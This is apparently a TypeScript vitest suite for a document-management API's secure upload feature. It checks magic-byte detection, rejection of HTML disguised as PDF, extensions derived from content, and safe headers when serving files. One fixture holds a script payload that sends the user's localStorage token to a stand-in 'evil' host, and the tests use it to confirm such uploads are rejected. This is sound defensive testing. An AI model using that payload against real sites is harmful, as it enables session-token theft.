import { describe, it, expect, vi, beforeEach, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import path from 'path';
import fs from 'fs';

// Diretório de uploads isolado para esta suíte (definido antes de importar o app),
// permitindo afirmar que uploads rejeitados não deixam nenhum arquivo em disco.
const { TEST_UPLOAD_DIR } = vi.hoisted(() => {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const nodePath = require('path') as typeof import('path');
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const nodeOs = require('os') as typeof import('os');
  const dir = nodePath.join(nodeOs.tmpdir(), `docsobs-doc34-${process.pid}-${Date.now()}`);
  process.env.UPLOAD_DIR = dir;
  return { TEST_UPLOAD_DIR: dir };
});

vi.mock('../src/lib/prisma.js', () => {
  const mockPrisma: any = {
    user: { findUnique: vi.fn() },
    companyConfig: { findFirst: vi.fn() },
    documentCategory: { findUnique: vi.fn() },
    document: {
      create: vi.fn(),
      findMany: vi.fn(),
      findUnique: vi.fn(),
      update: vi.fn(),
      delete: vi.fn(),
      count: vi.fn(),
    },
    auditLog: { create: vi.fn() },
    $transaction: vi.fn(async (callback: any) =>
      typeof callback === 'function' ? callback(mockPrisma) : Promise.all(callback)
    ),
  };
  return { prisma: mockPrisma };
});

import { Role, DocumentStatus, NotificationMode } from '@prisma/client';
import { app } from '../src/app.js';
import { generateToken } from '../src/utils/jwt.js';
import { UPLOADS_DIR, detectFileType } from '../src/services/storageService.js';
import { prisma } from '../src/lib/prisma.js';

const PDF_BYTES = Buffer.from('%PDF-1.4\n1 0 obj\n<<>>\nendobj\ntrailer\n<<>>\n%%EOF\n');
const PNG_BYTES = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d]);
const JPEG_BYTES = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00]);
const HTML_BYTES = Buffer.from(
  '<!doctype html><html><body><script>fetch("//evil/?t="+localStorage.getItem("token"))</script></body></html>'
);

const validCategoryId = 'c0000000-0000-0000-0000-000000000001';

const opToken = generateToken({
  userId: 'op-uuid-2',
  email: 'operacional@docsobs.com.br',
  name: 'Operacional Teste',
  role: Role.OPERATIONAL,
});

function listUploads(): string[] {
  return fs.existsSync(UPLOADS_DIR) ? fs.readdirSync(UPLOADS_DIR) : [];
}

function postAttachment(buffer: Buffer, filename: string, contentType: string) {
  return request(app)
    .post('/api/v1/documents')
    .set('Authorization', `Bearer ${opToken}`)
    .field('title', 'Documento DOC-34')
    .field('categoryId', validCategoryId)
    .field('issueDate', '2026-01-01')
    .attach('attachment', buffer, { filename, contentType });
}

describe('DOC-34 - Upload seguro de anexos (magic bytes, extensão derivada e cabeçalhos)', () => {
  beforeAll(() => {
    vi.spyOn(console, 'error').mockImplementation(() => {});
    vi.spyOn(console, 'warn').mockImplementation(() => {});
  });

  afterAll(() => {
    vi.restoreAllMocks();
    fs.rmSync(TEST_UPLOAD_DIR, { recursive: true, force: true });
  });

  beforeEach(() => {
    vi.clearAllMocks();
    for (const f of listUploads()) fs.unlinkSync(path.join(UPLOADS_DIR, f));
    (prisma.companyConfig.findFirst as any).mockResolvedValue({
      notificationMode: NotificationMode.ALL_ADMINS,
    });
    (prisma.documentCategory.findUnique as any).mockResolvedValue({ id: validCategoryId, name: 'Fiscal' });
    (prisma.document.create as any).mockImplementation(({ data }: any) => ({
      id: 'doc-34-uuid',
      status: DocumentStatus.REGULAR,
      ...data,
    }));
    (prisma.auditLog.create as any).mockResolvedValue({ id: 'audit-doc-34' });
  });

  it('usa o diretório de uploads isolado da suíte', () => {
    expect(UPLOADS_DIR).toBe(path.resolve(TEST_UPLOAD_DIR));
  });

  describe('detectFileType (sniffer de magic bytes)', () => {
    it('detecta PDF, PNG e JPEG e rejeita HTML/vazio/assinatura truncada', () => {
      expect(detectFileType(PDF_BYTES)).toEqual({ mime: 'application/pdf', ext: '.pdf' });
      expect(detectFileType(PNG_BYTES)).toEqual({ mime: 'image/png', ext: '.png' });
      expect(detectFileType(JPEG_BYTES)).toEqual({ mime: 'image/jpeg', ext: '.jpg' });
      expect(detectFileType(HTML_BYTES)).toBeNull();
      expect(detectFileType(Buffer.alloc(0))).toBeNull();
      expect(detectFileType(Buffer.from('%PDF'))).toBeNull();
      expect(detectFileType(Buffer.from([0x89, 0x50, 0x4e, 0x47]))).toBeNull();
    });
  });

  describe('Tabela de casos do upload', () => {
    it('rejeita HTML declarado como application/pdf com nome laudo.html e não deixa arquivo em disco', async () => {
      const res = await postAttachment(HTML_BYTES, 'laudo.html', 'application/pdf');

      expect(res.status).toBe(400);
      expect(res.body.error).toBe('INVALID_FILE_TYPE');
      expect(res.body.message).toContain('Tipo de arquivo não permitido');
      expect(prisma.document.create).not.toHaveBeenCalled();
      expect(listUploads()).toEqual([]);
    });

    it('grava PDF legítimo com nome documento.exe como *.pdf (extensão derivada do conteúdo)', async () => {
      const res = await postAttachment(PDF_BYTES, 'documento.exe', 'application/pdf');

      expect(res.status).toBe(201);
      expect(res.body.document.attachmentUrl).toMatch(/^\/api\/v1\/uploads\/\d+-[0-9a-f]{16}\.pdf$/);
      expect(res.body.document.attachmentFilename).toBe('documento.exe'); // só metadado
      expect(res.body.document.fileMimeType).toBe('application/pdf');
      expect(res.body.document.fileSizeBytes).toBe(PDF_BYTES.length);

      const files = listUploads();
      expect(files).toHaveLength(1);
      expect(files[0]).toMatch(/\.pdf$/);
      expect(fs.readFileSync(path.join(UPLOADS_DIR, files[0])).equals(PDF_BYTES)).toBe(true);
    });

    it('rejeita PNG declarado como image/jpeg (tipo declarado não confere) sem deixar arquivo', async () => {
      const res = await postAttachment(PNG_BYTES, 'foto.jpg', 'image/jpeg');

      expect(res.status).toBe(400);
      expect(res.body.error).toBe('INVALID_FILE_TYPE');
      expect(res.body.message).toContain('não confere');
      expect(listUploads()).toEqual([]);
    });

    it('grava JPEG real chamado foto.jpeg com extensão .jpg', async () => {
      const res = await postAttachment(JPEG_BYTES, 'foto.jpeg', 'image/jpeg');

      expect(res.status).toBe(201);
      expect(res.body.document.attachmentUrl).toMatch(/\.jpg$/);
      expect(res.body.document.fileMimeType).toBe('image/jpeg');
      expect(listUploads()).toHaveLength(1);
    });

    it('aceita o alias image/jpg declarado para JPEG real e normaliza o MIME gravado', async () => {
      const res = await postAttachment(JPEG_BYTES, 'foto.jpg', 'image/jpg');

      expect(res.status).toBe(201);
      expect(res.body.document.fileMimeType).toBe('image/jpeg');
      expect(res.body.document.attachmentUrl).toMatch(/\.jpg$/);
    });

    it('rejeita arquivo vazio declarado como PDF sem deixar arquivo', async () => {
      const res = await postAttachment(Buffer.alloc(0), 'vazio.pdf', 'application/pdf');

      expect(res.status).toBe(400);
      expect(res.body.error).toBe('INVALID_FILE_TYPE');
      expect(listUploads()).toEqual([]);
    });

    it('mantém o erro de tamanho existente (FILE_TOO_LARGE) para arquivo acima do limite', async () => {
      const oversized = Buffer.concat([PDF_BYTES, Buffer.alloc(10.5 * 1024 * 1024, 0)]);
      const res = await postAttachment(oversized, 'grande.pdf', 'application/pdf');

      expect(res.status).toBe(400);
      expect(res.body.error).toBe('FILE_TOO_LARGE');
      expect(listUploads()).toEqual([]);
    });

    it('rejeita HTML declarado como text/html já no pré-filtro', async () => {
      const res = await postAttachment(HTML_BYTES, 'laudo.html', 'text/html');

      expect(res.status).toBe(400);
      expect(res.body.error).toBe('INVALID_FILE_TYPE');
      expect(listUploads()).toEqual([]);
    });

    it('aplica a mesma validação na renovação (POST /:id/renew) antes de tocar no banco', async () => {
      const res = await request(app)
        .post('/api/v1/documents/doc-34-uuid/renew')
        .set('Authorization', `Bearer ${opToken}`)
        .field('issueDate', '2026-01-01')
        .attach('attachment', HTML_BYTES, { filename: 'laudo.html', contentType: 'application/pdf' });

      expect(res.status).toBe(400);
      expect(res.body.error).toBe('INVALID_FILE_TYPE');
      expect(prisma.document.findUnique).not.toHaveBeenCalled();
      expect(listUploads()).toEqual([]);
    });
  });

  describe('Cabeçalhos ao servir anexos (/api/v1/uploads)', () => {
    it('serve PDF com Content-Type fixo, nosniff e Content-Disposition: attachment', async () => {
      const name = '1700000000000-0123456789abcdef.pdf';
      fs.writeFileSync(path.join(UPLOADS_DIR, name), PDF_BYTES);

      const res = await request(app)
        .get(`/api/v1/uploads/${name}`)
        .set('Authorization', `Bearer ${opToken}`);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('application/pdf');
      expect(res.headers['x-content-type-options']).toBe('nosniff');
      expect(res.headers['content-disposition']).toBe(`attachment; filename="${name}"`);
      expect(res.headers['content-security-policy']).toContain("default-src 'none'");
    });

    it('serve JPEG legado (.jpeg) como image/jpeg e attachment', async () => {
      const name = '1700000000000-legacy.jpeg';
      fs.writeFileSync(path.join(UPLOADS_DIR, name), JPEG_BYTES);

      const res = await request(app)
        .get(`/api/v1/uploads/${name}`)
        .set('Authorization', `Bearer ${opToken}`);

      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('image/jpeg');
      expect(res.headers['content-disposition']).toMatch(/^attachment;/);
      expect(res.headers['x-content-type-options']).toBe('nosniff');
    });

    it('não serve anexos legados com extensão fora da allow-list (ex.: .html gravado antes do fix)', async () => {
      const name = '1700000000000-legacy.html';
      fs.writeFileSync(path.join(UPLOADS_DIR, name), HTML_BYTES);

      const res = await request(app)
        .get(`/api/v1/uploads/${name}`)
        .set('Authorization', `Bearer ${opToken}`);

      expect(res.status).toBe(404);
      expect(res.headers['content-type']).not.toMatch(/text\/html/);
      expect(res.text).not.toContain('<script>');
    });

    it('continua exigindo autenticação para baixar anexos', async () => {
      const name = '1700000000000-0123456789abcdef.pdf';
      fs.writeFileSync(path.join(UPLOADS_DIR, name), PDF_BYTES);

      const res = await request(app).get(`/api/v1/uploads/${name}`);
      expect(res.status).toBe(401);
    });

    it('aplica helmet globalmente em respostas JSON da API (health check)', async () => {
      const res = await request(app).get('/api/v1/health');

      expect(res.status).toBe(200);
      expect(res.headers['x-content-type-options']).toBe('nosniff');
      expect(res.headers['content-security-policy']).toContain("frame-ancestors 'none'");
      expect(res.headers['x-powered-by']).toBeUndefined();
    });

    it('mantém CORS habilitado após adicionar helmet', async () => {
      const res = await request(app)
        .get('/api/v1/health')
        .set('Origin', 'http://localhost:5173');

      expect(res.headers['access-control-allow-origin']).toBe('*');
    });
  });
});
